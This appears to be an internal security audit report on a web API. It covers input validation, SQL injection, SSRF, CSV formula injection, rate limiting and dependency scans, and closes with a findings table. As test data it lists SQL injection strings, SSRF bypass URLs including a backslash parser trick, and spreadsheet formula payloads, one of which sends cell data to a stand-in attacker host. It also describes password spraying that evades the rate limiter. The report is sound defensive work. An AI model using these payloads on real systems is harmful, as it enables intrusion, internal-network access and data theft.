# Audit 3, leaf 1.8: input validation, injection, egress, CSV, rate limits, dependencies

Code: backend worktree `C:/Users/Windows/bl-wt-secaudit3` at `786efcf0` (origin/main, what production runs). Frontend: fresh worktree `C:/Users/Windows/bl-web-audit3-leaf18` at bridgeleads-web origin/master `6030491`.

Method, in order:
1. Own pass from the code: every Pydantic schema in `src/api/schemas.py` (read in full, 2130 lines), every `Query(...)` parameter in `src/api/routes/**`, every `text()` / f-string / `.format()` SQL construction in `src/`, every outbound HTTP call site, every CSV/XLSX/JSON writer, and an AST scan of every route for limiter calls.
2. In-process probes against the real `main.app` (httpx `ASGITransport`) on my own isolated database `bl_audit3_input_test` (migrated to head 102) and Redis db 10. Scripts and raw output are in the scratchpad folder `ie18/` (`probe_http.py`, `probe_paths.py`, `probe_spray.py`, `probe_ssrf_csv.py`, `probe_differential.py`, `rl_matrix.py`, each with a `.out` file).
3. SSRF probes used only a listener on 127.0.0.1. Hostname answers were served from a table in the harness (a replaced `socket.getaddrinfo`), so no DNS query and no connection left the machine.
4. Dependency scanners: `pip-audit 2.10.1` in its own uv venv; `npm audit` (prod and full) in the fresh frontend worktree.
5. Re-verification of every audit #2 item in this area (`C:/Users/Windows/bl-wt-secaudit2/tasks/audit2-egress.md`, `SECURITY-AUDIT.md`).

No production requests were made by this leaf. No county, Tracerfy, Stripe or Resend traffic was sent.

## Check 16: input validation

What was checked, and what the server enforces (only server-side enforcement counted):

| Input | Where enforced | Type / length / format / allowed values | Result |
|---|---|---|---|
| email (register, login, forgot, delivery emails) | `schemas.py:87,149,172,505` | `EmailStr` (email-validator caps 254 chars); delivery list `max_length=10` plus a validator (`schemas.py:564-569`) | PASS. Negative control: PATCH with `deliver.emails=["not-an-email"]` returned 422, because the lenient `DeliverUpdate.emails: list[str]` (`schemas.py:818`) is re-validated through `DeliverConfig(**merged)` (`routes/scrapers.py:526`) |
| password (register, change, reset, verify, login, reauth, MFA disable) | `schemas.py:21-32,152,156,212,397` | 10 to 72 characters on set; `max_length=72` on login/reauth | Bounds PASS. The 422 body echoes the rejected password (IE-6, REPRODUCED) |
| first / last / display name | `schemas.py:44-83` | 1000 raw cap, NFC, whitespace collapse, category-C characters rejected, 120 chars, 255 bytes | PASS (read) |
| referral code | `schemas.py:137-145` | 64 raw, 16 alnum, silently dropped otherwise | PASS |
| tokens (reset, verify, MFA, refresh) | `schemas.py:183,225,234,342,387` | `max_length=4096` | PASS |
| MFA codes | `schemas.py:201,214,226,235` | 6 to 10 / 32 / 64 | PASS |
| scraper name | `schemas.py:675,877` | `max_length=120`, any characters | PASS for length; free text is html-escaped in email templates (audit #2 section 3, not re-tested here) |
| county / state / record type (scraper create) | `schemas.py:676-707` | 64 / 2-letter / 64, lowercased; the route requires an active connector (`routes/scrapers.py:151`) | PASS. Negative control: `county="pierce' OR 1=1--"` returned 422 "No active connector" |
| batch counties / record types | `schemas.py:910-942`, `routes/batches.py:305` | list 1..250 / 1..10, deduped; every pair checked against connectors | PASS. Control: 3 x 100,000-char counties returned 422. Note: the 422 detail echoes up to 10 invalid names at full length (response amplification only) |
| doc_types | `schemas.py:690,883`, `routes/scrapers.py:164-177` | list max 10, canonical values checked in the route | PASS. Control: `["x"*50000]` returned 422 |
| schedule / date range | `schemas.py:406-457` | frequency allowlist, hour 0-23, minute 0-59, weekday 0-6, day 1-31, date strings 32 chars, inverted custom range rejected | No maximum span on a custom range (IE-8, carried B-8) |
| segment filters | `schemas.py:1934-2062` | record types slug regex `^[a-z][a-z0-9_]{0,63}$`, 2..10 / 1..10; counties max 100 items of 64 chars; `lookback_days` 1..3660; typed `date` bounds; inverted window rejected | PASS. Controls: slug with `); DROP TABLE` and a 65-char county both 422 |
| webhook URLs | `schemas.py:476-491,589-592` | https only, host required, 2000 chars. Save time is structural only by design; the SSRF check runs at send time | PASS for scheme/length (http, file: and 2100-char URLs all 422). `https://127.0.0.1/x`, `https://169.254.169.254/latest` and `https://[::ffff:169.254.169.254]/` saved with 200 (by design, see IE-15) |
| webhook secrets, PhoneBurner token / owner | `schemas.py:494-501,545-562` | 24..256; token 4096 without CR/LF/TAB; owner 64 | PASS |
| delivery formats, CSV layout, dialer type | `schemas.py:533,535-543,571-587,851` | allowlists (`Literal`, `SUPPORTED_EXPORT_FORMATS`, `REGISTERED_DIALER_VENDOR_IDS`) | PASS |
| profile / notification prefs / logout / scraper PATCH | `schemas.py:287,311,385,816,849,873` | `extra="forbid"` | PASS (mass assignment of plan/is_admin rejected by shape) |
| connectors (admin) | `schemas.py:1825-1852` | 64 / 2 / list 20 of 64 / URLs 2000; SSRF-validated in the route | PASS (admin plus MFA only) |
| job create | `schemas.py:1068-1077` | config id 64 chars, trigger allowlist | Bad UUID reaches the DB and returns 500 (IE-5) |
| pagination | `routes/jobs.py:410-411`, `routes/scrapers.py:1153-1154`, `routes/batches.py:1007-1008,1048-1049` | `page_size` capped 100 or 500; `page` has `ge=1` and no upper bound | `page=2**62` and `page=10**19` return 500 (IE-4, REPRODUCED) |
| search `q` | `routes/jobs.py:412` (`max_length=100`), `routes/scrapers.py:1155` (unbounded, ignored above 100 at `:1202`) | `sanitize_search` escapes `\`, `%`, `_` (`security.py:510-520`), bound as a parameter with `escape="\\"` (`routes/jobs.py:493-498`) | PASS |
| sort / category / tax / owner filters | `results_sort.py:39`, `results_category.py:30`, `routes/jobs.py:417-435` | `Literal` allowlists; amounts 0..1e8; months 0..1200 | PASS. Controls: `sort=party_name`, `sort=date_desc; DROP TABLE results`, `category=all` all 422 |
| batch lead filters | `routes/batches.py:1009-1021` | record type 64, county 128, bound parameters | PASS |
| analytics window | `routes/analytics.py:55` | `Literal[30, 90]` after coercion | PASS |
| path ids (`job_id`, `config_id`, `batch_id`) | untyped `str` in every route | not validated as UUID | 500 on any non-UUID value (IE-5, REPRODUCED) |
| request body size | nothing in `main.py` or middleware | none | An 8 MiB JSON body on `/auth/login` was fully parsed (401, not 413) (IE-7) |

Unbounded strings or lists found: path ids (IE-5), `page` (IE-4), request body (IE-7), and the custom date span (IE-8). No list without a `max_length` was found in a request schema.

## Check 17: SQL injection

Inventory (grep of `text(` / `sa_text(` / `literal_column(` / f-string and `.format()` SQL): 46 sites in `src/api`, 166 in `src/workers`, 20 in `src/db` + `src/utils`, 58 matches in `src/scrapers` (most are BeautifulSoup/Playwright text helpers; the three scraper files that import SQLAlchemy `text` use bound parameters).

Every dynamic SQL construction and why it is not injectable:

| Construction | Evidence | What is interpolated | Verdict |
|---|---|---|---|
| Segment queries `_INTERSECTION_SQL` / `_UNION_SQL` / `_EXCLUDED_NO_DATE_SQL` via `.format(county_clause=...)` | `routes/segments.py:197-545,631-645,759-762` | a constant clause `AND sc.county = ANY(:counties)` or empty; values bound (`:uid`, `:types`, `:counties`, dates) | Parameterized |
| Batch combined / facets / filtered total CTEs | `workers/batch_export.py:55-210`, `routes/batches.py:906-960` | constants only; `f_record_type`, `f_county`, `limit`, `offset` bound | Parameterized |
| Cached records doc-type and search clauses | `routes/scrapers.py:1119-1144,1196-1224` | clause text is hardcoded, keyword values bound as `:kw_i` / `:ex_i` / `:q` | Parameterized |
| Results sort | `results_sort.py:203-215` | Core expressions chosen from the `Literal` value; `_render_inline` refuses `\` and `:` (`results_sort.py:177-182`) and aliases must be identifiers (`:168-169`) | Allowlisted |
| Actionability / category / tax cap / located-parcel predicates | `lead_actionability.py:54,68-71,113`, `results_category.py:47,67`, `tax_filters.py:161-162`, `located_parcel.py:53-57` | module constants and caller-written aliases; tax bound `:tax_cap_min_year` | Constants |
| Survivor merge `UPDATE results SET {sets}` | `workers/tasks_helpers/dedup.py:531-548` | column names from the internal `_merged_survivor_fields` dict, values bound | Constants |
| Bulk VALUES builders | `workers/tasks.py:1199`, `tasks_helpers/dedup.py:73`, `skip_trace_claim.py:448-470` | generated `:name_k` placeholders only | Parameterized |
| Retention / lock timeouts / advisory locks | `scheduler_helpers/retention.py:102-223`, `routes/billing.py:1786`, `cv_owner_recovery.py:431`, `daily_scrape.py:51,151` | module constants; the advisory key is an integer from an MD5 prefix | Constants |
| RLS GUC | `deps.py:39`, `routes/jobs.py:1421`, `auth_helpers/login.py:146,248` | `set_config('app.current_user_id', :uid, true)` | Parameterized |
| ArcGIS `where` strings (third-party GIS, not our DB) | `county_gis.py:347,402,437,1299,1428-1430`, `king_address_points.py:236` | `_arcgis_literal()` quoting (`county_gis.py:857`), FIPS from a constant map, street names restricted to `^[A-Z0-9]{1,80}$` (`king_address_points.py:81,127`) | Quoted / allowlisted |

Non-destructive probes on the local DB (`probe_http.out`, `probe_paths.out`), tenant A with 3 rows, tenant B with 1 row named `BOB SECRET TENANTB`:
- `/jobs/{id}/results?q=` with `' OR '1'='1`, `') OR 1=1--`, `SMITH%' --`, `x' UNION SELECT party_name FROM results--`, `\`: all 200 with 0 rows. `%` and `_` matched only the row that literally contains them (wildcards escaped). `SMITH` matched 1. No tenant B row in any response.
- `/scrapers/{id}/records?q=' OR '1'='1` and `q=%`: total 0; `q=SMITH`: total 1.
- `/segments/union` with `counties=["pierce' OR '1'='1"]`: 0 rows; with `["pierce"]`: 3 rows, no tenant B row.
- `/batches/{id}/leads?county=pierce' OR '1'='1` and `record_type=x' OR 1=1--`: total 0; unfiltered: 3.
- Path ids `' OR '1'='1`, `1;DROP TABLE jobs`: rejected by asyncpg as an invalid UUID parameter (bound, not interpolated), which surfaces as a 500 (IE-5).

Conclusion: no SQL injection found. Negative controls are the probes above plus the table: every interpolated fragment is a module constant, a generated placeholder, or an allowlisted `Literal`.

## Check 18: NoSQL injection

Not applicable. Evidence:
- No document database or query-document client in either repo: `grep` for `pymongo|motor|elasticsearch|dynamodb|firestore|supabase` in `src/` and `main.py` finds only comments; the frontend has no `@supabase` or `supabase-js` import and no dependency on it (`package.json`).
- Redis is key/value only. Keys are built from server values (user id, jti, `blind_index(email)`, the rate-limit identifier). The six `eval` call sites run module-constant Lua with `KEYS`/`ARGV` (`auth_hardening.py:629-640,775`, `sse_leases.py:120,140`, `source_admission.py:145,194`, `cv_owner_recovery.py:240,250`). redis-py sends binary-safe arguments, so a client string cannot become a command.
- JSONB access uses constant keys only (`lead_actionability.py:54,87`, `located_parcel.py:53-57`); no route builds a JSONB filter or path from a client dict. `enrichment_data` is written by workers, not by clients.
- Stored JSON columns written by clients (`deliver`, `schedule`, `fields`, notification prefs) pass typed Pydantic models first (`extra="forbid"` where it matters, section above).

## Webhook SSRF

Customer-configured destinations: job webhook `deliver.webhook_url` and dialer push `deliver.dialer_webhook_url`. Both go through `deliver_job_webhook` (`webhook_delivery.py:296-462`), enqueued at `workers/tasks.py:2494` and `workers/scheduler_helpers/dialer.py:332`. PhoneBurner uses a hardcoded host (`dialer_connectors/phoneburner.py:215`, host check `dialer_outbox.py:233-241`). No other route fetches a customer URL: scraper configs carry no URL, and `base_url` / `gis_endpoint` / `assessor_url` are admin-only.

Results (`probe_ssrf_csv.out`):
- **Blocklist (41 URLs):** blocked: `http://`, `ftp://`, `gopher://`, `file:`; `127.0.0.1`, `127.1`, `2130706433`, `0x7f000001`, `0177.0.0.1`, `0.0.0.0`, RFC1918, `169.254.169.254`, `100.64.0.1`; `[::1]`, `[::]`, `[::ffff:127.0.0.1]`, `[::ffff:a9fe:a9fe]`, NAT64 `[64:ff9b::a9fe:a9fe]`, 6to4 `[2002:a9fe:a9fe::1]`, `[::a9fe:a9fe]`, `[fe80::1%25eth0]`, AWS IPv6 IMDS `[fd00:ec2::254]`, `[fc00::1]`; `localhost`, `LOCALHOST.`, `metadata.google.internal`; hostnames answering loopback, metadata, CGNAT, IPv4-mapped, NAT64, or a public+private mix; userinfo and `#@` tricks; NXDOMAIN (fails closed). Allowed: a public host. One miss: `https://127.0.0.1\@public.test/` passed validation (IE-2).
- **DNS rebinding (audit #2 F-03), re-verified as FIXED:** a host answering public to `validate_outbound_webhook` and `127.0.0.1` at connect was refused inside `_new_conn` (`pinned_http.py:49-87`), `is_blocked_destination` True, listener hits 0. Negative control: an unpinned `requests.Session` with the same resolver reached the loopback listener (status 200, 1 hit). Hosts with any blocked answer in a mixed set are refused whole (`pinned_http.py:58-65`).
- **Redirects:** `allow_redirects=False` (`webhook_delivery.py:377`); a 302 to `http://169.254.169.254/` was returned as 302 with a single listener hit, and the task treats 3xx as a permanent failure (`:403-416`). With `allow_redirects=True` forced, the next hop was also refused at connect (the pin covers every connection).
- **Proxies:** with `HTTP(S)_PROXY` pointed at the listener, the pinned session made 0 proxy connections (`trust_env=False`, `proxy_manager_for` raises, `pinned_http.py:121-131`).
- **Parser differential (new, IE-2):** `validate_scraping_target` reads the host with `urllib.parse.urlparse` (`security.py:234,241-242`) while `requests`/urllib3 connect to the host `urllib3.util.parse_url` reads. For `http://127.0.0.1:PORT\@portal.test/x`, urlparse says `portal.test`, urllib3 says `127.0.0.1:PORT`. The webhook path is still protected: `validate_outbound_webhook` passed, then the pinned socket refused the loopback literal (0 hits). The unpinned `safe_http` helpers are not: `safe_get(require_allowlisted=False)` returned the loopback listener's body, and `safe_get(require_allowlisted=True, same_origin_as="http://portal.test/")` sent the portal session cookie to 127.0.0.1 (`probe_differential.out`). Reachable inputs: EagleWeb detail hrefs from portal DOM (`templates/eagleweb.py:1094-1101`, though that href comes from Chromium's `link.href`, which normalizes `\`), newspaper PDF links matched with the same `urlparse` host check (`workers/nts_crawler.py:393-402`, `snohomish_wa_pre_foreclosure.py:98-104`), the Tracerfy download host pin (`tracerfy_ingest.py:436-455`, `urlsplit`), and every redirect `Location` followed by `safe_get_following` / `safe_download_to_file` (`safe_http.py:178,244`).
- **Other egress status:** audit #2 E-1 FIXED (2 KB raw excerpt, never decoded, 60/90 s task limits, `webhook_delivery.py:72-78,111-132,305-306`). E-2 FIXED (type and host only, exception not chained, `:386-397`). E-3 FIXED (embedded-IPv4 unwrapping, `security.py:104-143`, and the matrix above). E-4 OPEN (`base_scraper.py:339` no `service_workers="block"`, no WebSocket route, fail-open at `:458-460`). F-07 OPEN (`base_scraper.py:281` `--no-sandbox`, tracked by the infra leaf). E-5 OPEN (IE-11). Non-webhook egress (`safe_http`) still validates then connects without a pin (IE-12).

## CSV / XLSX / JSON formula injection

Writers enumerated: `write_lead_csv` and `write_lead_csv_with_overlap` (`lead_export.py:659-845`), `DataExporter.to_csv/to_excel/to_json` (`data_exporter.py:98-212`). Callers: live job download (`routes/jobs.py:1570-1589`), segment export (`routes/segments.py:144`), batch combined export (`workers/batch_export.py:379,475`), scheduled/email export (`workers/tasks.py:1451,2034`). The frontend only saves server bytes (`lib/api.ts:979,1018,1177,1217`); it has no CSV builder. The only other `csv.DictWriter` is an operator script (`scripts/backfill_preforeclosure_party_names.py:151`).

`sanitize_for_csv` (`security.py:457-483`) results (`probe_ssrf_csv.out`):
- Prefixed with `'`: `=HYPERLINK("https://evil.tld/?d="&A1,"x")`, `+cmd|' /C calc'!A0`, `-2+3`, `@SUM(1+1)*cmd|...`, leading TAB / CR / LF, leading space, leading `"` / `'` / backtick, leading NBSP, leading U+3000. Embedded TAB becomes a space (`ABC\t=1+1` to `ABC =1+1`).
- Not prefixed: full-width `＝HYPERLINK(...)` (U+FF1D), full-width `＋`, zero-width space and BOM prefixes (IE-14, INFO).

End-to-end export of one row carrying a payload in every free-text field, including `enrichment_data` passthrough keys, NTS trustee fields, secondary phones and emails:
- CSV: 0 cells start with a trigger except numeric columns. Negative numbers are intact (`delinquent_amount=-123.45`, `tax_billed_amount=-50.5`), because DB-typed numerics are emitted unsanitized (`lead_export.py:582-583,418-437`). The phone `+1 (206) 555-1234` became `2065551234` (`lead_formatting.py:136-152`), so a `+1` phone is neither corrupted nor a formula.
- XLSX: 0 cells with openpyxl `data_type == "f"`; header labels are constants (`CRM_V1_LABELS`).
- JSON: 0 values start with a trigger (same builder).
- Accepted trade-off: literal `'` in JSON and for a standalone `-` or an email starting with `+`/`-`.

Push channels:
- PhoneBurner: sanitized (`phoneburner.py:88-106`); the probe showed `owner_name`, `address`, `mailing_address` prefixed. Phone and email left raw on purpose (`dialer_connectors/base.py:96-104`).
- Generic dialer webhook: raw (`generic_webhook.py:19-58`, `webhook_delivery.py:208-276`); the probe payload carried `=HYPERLINK(...)` unchanged. This is audit #2 F-02r, still a documented product decision (IE-9, P3).
- Job completion webhook: carries no lead text at all (keys `delivered_at, download, event, job, scraper, signature`); the only free text is the tenant's own scraper name. Audit #2 listed it under F-02r; that part does not apply.

## Rate limiting

Limiter: Redis sliding window (`rate_limit.py:175-232`), zones `auth` 10/min, `jobs` 5/min, `general` 60/min, `webhook` 120/min, `stripe` 10/min (`:24-42`). Failed-login lockout: `BruteForceProtection` keyed on IP and `blind_index(email)` (`auth_hardening.py:445-450,562-692`); email lock capped at 15 minutes (`:527`). MFA: `MfaFailureGuard` (`:721-790`). Forgot-password: `once_per` on the address.

How IP keys behave (reproduced in-process with the production peer topology, `probe_http.out`, `probe_spray.out`):
- `client_ip()` trusts `X-Forwarded-For` only when the TCP peer is loopback or RFC1918 (`rate_limit.py:54-60,99-109`). Railway's mesh connects from `100.64.0.0/10`, which is not trusted, and `start.sh:97` runs uvicorn without `--proxy-headers`. The code itself records that this peer rotates per request (`auth_helpers/password.py:410-416`), and audit #2 measured 14/14 forgot-password requests with 0 x 429 live.
- Result: every IP-keyed limit and the IP half of the failed-login lockout key on a Railway mesh address, not on the client. Spraying one password over 30 accounts from 30 rotating `100.64.x.y` peers gave 30 x 401, 0 x 429, 30 distinct buckets. Control: the same 30 requests from one fixed peer gave 5 x 401 then 25 x 429.
- Behind Cloudflare: Cloudflare edge rate rules do not help, because the Railway edge is reachable directly (leaf 1.5, IO-1, REPRODUCED). What the Cloudflare bypass means for IP keys: if the fix is to trust `100.64.0.0/10` and take the last `X-Forwarded-For` hop, traffic through Cloudflare keys on the Cloudflare egress IP (many real users share one bucket), while bypass traffic keys on the attacker's real IP. If the fix is to trust `CF-Connecting-IP` or an earlier XFF hop, a direct-to-Railway attacker forges that header and mints a new key per request. Until the origin accepts only Cloudflare (Tunnel or authenticated origin pulls), no IP-derived key can be both honest and unforgeable. User-keyed limits are unaffected by any of this.

Per-endpoint matrix (from the AST scan in `rl_matrix.txt`, including one level of helper calls):

| Endpoint | Limiter | Key | In production |
|---|---|---|---|
| POST /auth/login | `auth` zone + BruteForceProtection (IP and email) + `mfa-issue:{user}` | IP; email; user | IP parts dead; email lock works (5 fast failures lock, slow spraying under 5 per 15 min is never locked) |
| POST /auth/register | `auth` zone | IP | dead |
| POST /auth/verify-email, /auth/reset-password | `auth` zone | IP | dead (tokens are signed JWTs, so guessing is not the risk) |
| POST /auth/forgot-password | `auth` zone + `once_per(address)` | IP; address | address guard works; IP part dead |
| POST /auth/refresh | `auth` zone | IP | dead |
| POST /auth/change-password | `auth` zone | IP | dead (see authn leaf AN-3) |
| POST /auth/login/mfa, /auth/mfa/disable | `auth` zone + per-user key + MfaFailureGuard | IP; user | user keys work |
| POST /auth/login/break-glass | `auth` zone + `mfa-breakglass:{user}` | IP; user | user key works |
| POST /auth/mfa/enable | `auth` zone + `mfa-user:{user}` | IP; user | user key works (no failure guard, authn AN-8) |
| POST /auth/api-key, /auth/mfa/setup | `reauth:{user}` | user | works |
| POST /auth/logout, /logout-all, GET /auth/me, /mfa/status, /onboarding, PUT /profile, /notification-preferences | none | none | authenticated, cheap |
| POST /jobs (scrape create) | `jobs` zone | user | 5/min works |
| DELETE /jobs/{id} (cancel) | none | none | IE-3 |
| GET /jobs, /jobs/{id} | none | none | cheap owner-scoped reads |
| GET /jobs/{id}/results (search, filters, sort, page) | `general` | user | 60/min works |
| GET /jobs/{id}/download | none | none | IE-3 (live full CSV build, PII decrypt) |
| GET /jobs/{id}/export-url | none | none | IE-3 |
| GET /jobs/{id}/logs (SSE) | per-user SSE lease (`sse_leases.py:112-145`) | user | concurrency-bounded |
| POST /scrapers/{c}/jobs/{j}/dialer-replay (replay) | `general` | user | works |
| POST /scrapers, PATCH /scrapers/{id} (webhook config, skip-trace toggle), DELETE /scrapers/{id}, GET /scrapers, /scrapers/{id} | none | none | IE-3 |
| PUT /scrapers/{id}/csv-layout, GET /scrapers/{id}/records | `general` | user | works |
| POST /segments/union, /intersection (+ /export) | `general` | user | works |
| POST /batches, GET /batches/{id}/leads, /runs, downloads | `general` | user | works; GET /batches and /batches/{id} none |
| GET /analytics/summary, /billing/usage, /referral, /skip-trace-usage | `general` | user | works |
| POST /billing/checkout, /portal, /change-plan, GET /billing/subscription | `stripe` (fail closed on Redis loss) | user | works |
| POST /billing/webhook, /webhooks/tracerfy, /webhooks/tracerfy/{secret} | `webhook` | IP | dead; signature / secret still required |
| GET /notifications, POST read-all, PATCH read | none | none | cheap |
| Skip tracing | no endpoint of its own; enabled through PATCH /scrapers (none) and billed per lookup | n/a | n/a |
| API-key access | same routes and limiters as a session (no separate per-key limit) | user | as above |
| Admin: GET /billing/activation-funnel, POST /scrapers/connectors, GET /scrapers/connectors?include_all | none (admin plus MFA required) | none | low exposure |
| GET /health, /ready, /auth/config, /billing/plans, /pricing, /scrapers/sample | none | none | public, cached or constant |

## Dependencies

- Backend: `pip-audit -r requirements.txt` in a fresh uv venv (Python 3.12, same minor as `Dockerfile:1`): **No known vulnerabilities found**, 94 packages resolved, 0 skipped. Resolved notable versions: fastapi 0.141.1 / starlette 1.7.0, requests 2.34.2 / urllib3 2.8.0, PyJWT 2.13.0, cryptography 50.0.0, python-multipart 0.0.31, h11 0.16.0, openpyxl 3.1.5, pandas 2.2.3, kombu 5.6.2, redis 5.2.1, stripe 11.4.0. Critical 0, high 0, medium 0, low 0. Exploitable in production: none known.
- Frontend (`6030491`): `npm audit --omit=dev`: 0 (128 prod deps). Full `npm audit`: 0 (855 total). Critical 0, high 0, moderate 0, low 0. `next` 16.3.5, `react` 19.2.3, `next-auth` 5.0.0-beta.32 (a beta carries production auth; no advisory).
- Deliberate pins, do not bump blindly: `stripe==11.4.0` (`requirements.txt:78-95`: from v15 `StripeObject` is no longer a `dict` and about 17 `.get()` call sites would raise); `redis==5.2.1` (`requirements.txt:29-34`: kombu declares `redis<6.5`, redis 8.x breaks the Celery broker and result backend).
- Gaps: transitive versions are not locked or hashed; the image resolves them at build (`Dockerfile:34-35`), so the audited set is not guaranteed to be the deployed set (IE-13). Linux-only extras of `uvicorn[standard]` (uvloop) were not resolved on Windows. CI installs dependencies in the step that holds production secrets (leaf 1.5, IO-2).

## Audit #2 items in this area, current status on 786efcf0

| Item | Status | Evidence |
|---|---|---|
| F-01 / F-01b IP rate limiting dead | F-01 OPEN (IE-1). F-01b CHANGED: the email lock arms at 5 fast failures (authn leaf) | `rate_limit.py:54-60`, `start.sh:97`, `probe_spray.out` |
| F-02 / F-02r push channels | PhoneBurner FIXED; generic dialer webhook OPEN by decision (IE-9); job webhook not affected | `phoneburner.py:88-106`, `probe_ssrf_csv.out` |
| F-03 rebinding | FIXED-verified | `pinned_http.py:49-87`, rebinding probe |
| F-07 Chromium `--no-sandbox` | OPEN (infra leaf) | `base_scraper.py:281` |
| F-08 response cap | FIXED on the webhook (E-1) and `safe_http`; PhoneBurner `resp.json()` unbounded but fixed host | `dialer_outbox.py:43-60` |
| F-09 no limiter on download / export-url | OPEN (IE-3) | `rl_matrix.txt` |
| E-1 webhook body / slot pinning | FIXED | `webhook_delivery.py:72-78,111-132,305-306` |
| E-2 webhook URL in exception logs | FIXED | `webhook_delivery.py:386-397` |
| E-3 IPv6 transition prefixes | FIXED | `security.py:104-143`, blocklist probe |
| E-4 browser guard gaps | OPEN (IE-10) | `base_scraper.py:339,458-460` |
| E-5 raw bodies in logs | OPEN (IE-11) | `webhook_delivery.py:420-423`, `skip_trace.py:649-652` |
| E-6 422 echoes input | OPEN (IE-6) | `main.py:105-111`, probe |
| B-8 custom range has no max span | OPEN (IE-8) | `schemas.py:429-457`, `tasks_helpers/dates.py:73-95` |

## Findings

| ID | Severity | Category | Component | Evidence | Prereqs | Impact | Remediation | Regression test | Status |
|---|---|---|---|---|---|---|---|---|---|
| IE-1 | P1 | Rate limiting (audit #2 F-01, still open) | client_ip() and every IP-keyed limiter (auth zone, webhook zone, BruteForceProtection IP half) | src/api/middleware/rate_limit.py:54-60 no 100.64.0.0/10, :99-109 returns the peer; start.sh:97 no --proxy-headers; src/api/routes/auth_helpers/password.py:410-416 states the Railway peer rotates per request; cmd:probe_spray.py 30 accounts x 1 password from rotating 100.64 peers gave 30 x 401 and 0 x 429 in 30 buckets, control from one peer gave 25 x 429; audit #2 live 14/14 forgot-password with 0 x 429 | None beyond a list of emails; Cloudflare edge rules are skippable via the Railway edge (leaf 1.5 IO-1) | Unthrottled credential stuffing and password spraying across accounts (the per-email lock never sees a second guess), unthrottled signup, refresh and change-password oracle, webhook signature spraying | First make Cloudflare the only ingress (Tunnel or authenticated origin pulls), then key on CF-Connecting-IP; until then add per-account and global login-failure budgets that do not depend on IP, and a global register budget. Never --forwarded-allow-ips=* | Test that requests from rotating untrusted peers carrying one forged client header share a bucket after the fix, plus a spray test across N accounts expecting 429 | REPRODUCED |
| IE-2 | P2 | SSRF (URL parser differential) | validate_scraping_target / validate_outbound_webhook vs requests+urllib3; safe_get, safe_get_following, safe_download_to_file; host pins built on urlparse/urlsplit | src/api/middleware/security.py:234,241-242 urlparse host; src/utils/safe_http.py:122-133,166-178,229-244 connect via requests; cmd:probe_differential.py http://127.0.0.1:PORT\@portal.test/ passed validation and safe_get returned the loopback body; with require_allowlisted=True and same_origin_as the portal cookie reached 127.0.0.1; pinned webhook session refused it (0 hits) | Control of a URL string that reaches safe_http: newspaper PDF hrefs (src/workers/nts_crawler.py:393-402, src/scrapers/snohomish_wa_pre_foreclosure.py:98-104), any redirect Location on a followed fetch, a Tracerfy download_url (src/workers/tracerfy_ingest.py:436-455, needs the webhook secret) | Worker requests to internal or metadata hosts and ports of the attacker's choice, bypass of the scrape allowlist and the Tracerfy host pin, county portal cookies sent to another host, attacker-served CSV ingested as skip-trace contacts | Parse once with urllib3.util.parse_url (the connecting parser) and reject any URL whose urlparse and parse_url hosts or ports differ, or containing a backslash or userinfo; better, route safe_http through pinned_session so the connect-time check is authoritative | Parametrized test: URLs with backslash-at, userinfo and port tricks must raise in validate_scraping_target, and safe_get to a loopback listener via such a URL must record 0 hits | REPRODUCED |
| IE-3 | P2 | Rate limiting (audit #2 F-09, still open) | GET /jobs/{id}/download, GET /jobs/{id}/export-url, DELETE /jobs/{id}, POST/PATCH/DELETE /scrapers | src/api/routes/jobs.py:1177,1252,371 and src/api/routes/scrapers.py:353,459,536 contain no rate_limit call (cmd:rl_matrix.py); download builds the full CSV live and decrypts PII per request (src/api/routes/jobs.py:1540-1589) | Any authenticated account or API key | DB and CPU amplification by looping full-job downloads, unbounded export-url token minting, config churn; cross-tenant availability impact on the shared DB | rate_limit(zone="general", identifier=user.id) on these routes, a tighter zone for download/export-url | Test that the 61st download in a minute returns 429 | CONFIRMED |
| IE-4 | P3 | Input validation (pagination bound) | page on /jobs/{id}/results, /scrapers/{id}/records, /batches/{id}/leads and runs/{run}/leads | src/api/routes/jobs.py:410,546; src/api/routes/scrapers.py:1153; src/api/routes/batches.py:1007,1048; cmd:probe_http.py page=2**62 and page=10**19 returned 500 with asyncpg "value out of int64 range" | Authenticated user | 500 responses and a full ERROR traceback per request (log noise), no data exposure | Add le= on page (for example 100000) or cap offset | Test page=10**19 returns 422 | REPRODUCED |
| IE-5 | P3 | Input validation (id format) | Path ids on /jobs, /scrapers, /batches and POST /jobs scraper_config_id | cmd:probe_paths.py not-a-uuid, quote payloads and a 5000-char id returned 500 on GET/DELETE /jobs/{id}, /results, /logs, GET /scrapers/{id}, /batches/{id}, POST /jobs; the ERROR log line carries the full raw id | Authenticated user | Bound parameter, so no injection; 500s plus log amplification of attacker text (5000 chars per line) without a limiter on most of these routes | Type path ids as uuid.UUID (FastAPI returns 422) or validate before the query | Test GET /jobs/not-a-uuid returns 422 | REPRODUCED |
| IE-6 | P3 | Verbose errors (audit #2 E-6, still open) | Default RequestValidationError handler | main.py:105-111 registers only an Exception handler; src/api/schemas.py:152 and :21-32; cmd:probe_http.py 80-char password on /auth/register and 73-char password on /auth/login both came back in the 422 body | User typo or a proxy / error reporter recording responses | Plaintext passwords reflected into responses and whatever logs them | Register a RequestValidationError handler that drops input and ctx | Test that an over-long password is absent from the 422 body | REPRODUCED |
| IE-7 | P3 | Input validation (body size) | All JSON routes | No body-size middleware in main.py:66-94; cmd:probe_http.py an 8 MiB JSON body on unauthenticated /auth/login was parsed (401, not 413) | None (unauthenticated) | Memory and CPU per request on the API; Railway edge limits not verified | Reject Content-Length above about 1 MiB in middleware and cap streamed bodies | Test a 2 MiB POST returns 413 | REPRODUCED |
| IE-8 | P3 | Input validation (date span, audit #2 B-8) | ScheduleConfig custom range | src/api/schemas.py:429-457 no maximum span; src/workers/tasks_helpers/dates.py:73-95 only orders; only connectors with max_date_range_days clamp (src/workers/tasks.py:609) | Authenticated user | Very long scrape windows load county portals and workers | Cap custom span per plan (for example 365 days) at the schema | Test a 20-year custom range returns 422 | CONFIRMED |
| IE-9 | P3 | CSV injection via push (audit #2 F-02r, accepted by design) | Generic dialer webhook | src/workers/dialer_connectors/generic_webhook.py:19-58; src/workers/webhook_delivery.py:208-276; cmd:probe_ssrf_csv.py payload party_name =HYPERLINK(...) delivered unchanged; PhoneBurner prefixed | A county record carrying a formula plus a customer piping the webhook into Zapier to Google Sheets (USER_ENTERED) | Formula executes in the customer's sheet | Offer an opt-in spreadsheet_safe flag per destination, default on for known Zapier/Make hosts | Test that the flag prefixes party_name and addresses | CONFIRMED |
